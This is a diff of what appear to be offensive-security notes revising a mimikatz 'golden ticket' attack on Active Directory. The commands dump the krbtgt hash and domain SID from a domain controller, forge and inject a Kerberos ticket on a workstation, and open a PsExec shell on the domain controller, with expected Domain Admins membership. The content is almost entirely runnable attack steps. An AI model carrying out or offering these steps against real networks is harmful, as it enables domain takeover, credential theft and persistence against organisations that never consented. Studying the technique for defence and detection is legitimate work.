@@ -150,11 +150,13 @@ DC mimikatz # privilege::debug
 DC mimikatz # lsadump::lsa /patch # search for the krbtgt service NTLM hash, and get the domain SID: S-1-5-21-x-y-z
 
 SomeWorkstation c:\path\to\mimikatz > mimikatz.exe # on a workstation, with a random user account
-DC mimikatz # kerberos::purge
-DC mimikatz # kerberos::golden /user:targetuserondc /domain:somedomainname.com /sid:S-1-5-21-x-y-z
+SomeWorkstation mimikatz # kerberos::purge
+SomeWorkstation mimikatz # kerberos::golden /user:targetrandomuser /domain:somedomainname.com /sid:S-1-5-21-x-y-z /krbtgt:NtlmHash /ptt
+SomeWorkstation mimikatz # misc::cmd
+
 SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainController cmd.exe # access granted on the Domain Controller
 DomainController c:\any\path > ipconfig
-c:\any\path > whoami # targetuserondc
+c:\any\path > whoami # targetrandomuser
 c:\any\path > whoami /groups # expected "somedomainname\Domain Admins"
 
 SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainControllerIpAddress cmd.exe # access denied, the IP address triggers an NTLM authentication
